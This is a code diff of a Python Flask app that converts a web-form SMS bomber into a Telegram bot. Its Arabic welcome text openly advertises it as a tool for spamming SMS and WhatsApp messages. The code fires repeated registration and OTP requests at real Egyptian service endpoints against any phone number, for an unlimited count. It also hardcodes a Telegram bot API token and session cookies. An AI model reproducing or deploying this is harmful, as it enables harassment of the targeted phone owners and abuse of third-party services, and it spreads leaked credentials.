@@ -1,14 +1,21 @@
-from flask import Flask, request
+# api/index.py
+from flask import Flask, request, jsonify
+import telebot
 import requests
 import json
+import pyfiglet
 
 app = Flask(__name__)
 
-# وظيفة لإرسال الطلبات
+# استبدل 'YOUR_API_TOKEN' بالـ API Token الخاص ببوتك
+API_TOKEN = '8092659458:AAEb49LjsN6WY0r04dMw4Q0peVKrSN9jHqU'
+bot = telebot.TeleBot(API_TOKEN)
+
 def send_requests(phone_number, num_messages, random_chars):
     results = []
 
     for i in range(num_messages):
+        # الطلبات من الكود الأصلي
         # 1. Filkhedma Register
         url = "https://api.filkhedma.net/v2/customer/register"
         payload = json.dumps({
@@ -255,39 +262,94 @@ def send_requests(phone_number, num_messages, random_chars):
         }
         response = requests.get(url, params=params, headers=headers)
         results.append(f"Alcoupon Send OTP {i+1}: {response.status_code} - {response.text}")
+        
+
+        url = "https://elfarmarket.com/api/customer/send_registration_code"
+
+        params = {
+  'channel_id': "-1",
+  'locale': "en",
+  'token': "true"
+}
+
+        payload = json.dumps({
+  "country_code": "+2",
+  "phone": phone_number
+})
+
+        headers = {
+  'User-Agent': "Android/2.0 build number: 62",
+  'Connection': "Keep-Alive",
+  'Accept': "application/json",
+  'Accept-Encoding': "gzip",
+  'Content-Type': "application/json",
+  'locale': "en",
+  'Cookie': "elfar_session=eyJpdiI6Ijk5QVFRXC9YSFhuelhSa3dVSGNRKzF3PT0iLCJ2YWx1ZSI6Im16U0M0SlBKOEo2ek1oNVRjZmtFYW92cnFsMEo1aWlETzZIenpoZzF4QU5xZThkaERNSE5NQVZ5Wlk1XC9HdllhaTY2T2RwYXpjb2xIa2J0XC9qZkVmK25BSUpnbkVhcE9tZFc0a0tBVWROdmJqVk5RdGdcL2tvd1lIak41NVhhSmdMIiwibWFjIjoiYjViMmY2NDk2MGQ2ZGE0N2QxNTNjYmJiYjNjNDBkNWU2NzQyODM2YmM5OTIxM2Y2MWMyYWM0Mzg4YWZhMzYxOSJ9; expires=Mon, 13-Jan-2025 08:58:11 GMT; Max-Age=720000; path=/; domain=elfarmarket.com"
+}
+
+        response = requests.post(url, params=params, data=payload, headers=headers)
+
+        print(response.text)
+        url = "https://gem-backend-prod.azurewebsites.net/api/customer/send_registration_code"
+
+        params = {
+  'channel_id': "0",
+  'locale': "en",
+  'token': "true"
+}
+
+        payload = json.dumps({
+  "country_code": "+2",
+  "phone": phone_number
+})
+
+        headers = {
+  'User-Agent': "Android/1.3 build number: 10",
+  'Connection': "Keep-Alive",
+  'Accept': "application/json",
+  'Accept-Encoding': "gzip",
+  'Content-Type': "application/json",
+  'locale': "en",
+  'Cookie': "beagmal_session=eyJpdiI6IjkrQ2RGdGhOaHVKS2pVaElOZ0FUWkE9PSIsInZhbHVlIjoiMWwrV0wzNXU3VHB1UTNiVzZsNnQ4bG9mUUNGM04yeEI0VGtTXC9MWXJsWklaWWhUM1RCeGRnRnhieG80VXd1blJBSlwvUHJCMXdzU1pHUnVldlRMajlPalpZOUNEbW5Nb3dOaEhyNnVxY2Y5WVpsZ0RpS01WY0pDaU95bkxHVXRSNSIsIm1hYyI6IjRhMjk0MDczMGY2YjI4YmNkMzQ0NzY5OGFjYTBhMjUxODE0YTRjMmE4NjU2NTZhMGZkNDYxMGE2MjMyYzg0ZGEifQ%3D%3D; expires=Mon, 13-Jan-2025 09:33:01 GMT; Max-Age=720000; path=/; secure; samesite=none"
+}
+
+        response = requests.post(url, params=params, data=payload, headers=headers)
+
+        print(response.text)
 
     return results
 
-# الصفحة الرئيسية
-@app.route('/', methods=['GET', 'POST'])
-def index():
-    if request.method == 'POST':
-        phone_number = request.form['phone_number']
-        num_messages = int(request.form['num_messages'])
-        random_chars = request.form['random_chars']
+# تعريف الأمر /start
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    bot.reply_to(message, "مرحبا في بوت اسبام رسائل نصيه ووتساب نسخه تجريبيه من تطوير الجزار لتشغيل البوت قم بارسال  الأمر ولاكن غير رقم الهاتف وايضا عدد الرسائل مثال :____. /send 01012345678 5 n3kf بتغير رقم الهاتف وبتضع عدد الرسائل مكان رقم 5 تقدر تغير ل لعدد غير محدود وبتقوم بتغيير الأربع حروف لأربع حروف مختلفه ")
 
+# تعريف الأمر /send
+@bot.message_handler(commands=['send'])
+def send_requests_command(message):
+    try:
+        # تقسيم النص المدخل إلى أجزاء
+        _, phone_number, num_messages, random_chars = message.text.split()
+        num_messages = int(num_messages)
+
+        # إرسال الطلبات
         results = send_requests(phone_number, num_messages, random_chars)
 
-        # عرض النتائج كـ HTML بسيط
-        response = "<h1>النتائج:</h1><ul>"
+        # إرسال النتائج إلى المستخدم
         for result in results:
-            response += f"<li>{result}</li>"
-        response += "</ul>"
-        return response
+            bot.reply_to(message, result)
+    except Exception as e:
+        bot.reply_to(message, f"حدث خطأ: {str(e)}")
 
-    # عرض نموذج الإدخال
-    return '''
-        <form method="POST">
-            <label for="phone_number">رقم الهاتف:</label><br>
-            <input type="text" id="phone_number" name="phone_number" required><br><br>
-            <label for="num_messages">عدد الرسائل:</label><br>
-            <input type="number" id="num_messages" name="num_messages" required><br><br>
-            <label for="random_chars">أحرف عشوائية:</label><br>
-            <input type="text" id="random_chars" name="random_chars" required><br><br>
-            <input type="submit" value="إرسال">
-        </form>
-    '''
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
+    bot.process_new_updates([update])
+    return 'ok', 200
 
-# تشغيل التطبيق
+@app.route('/')
+def index():
+    return 'Bot is running!'
+
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=3000)
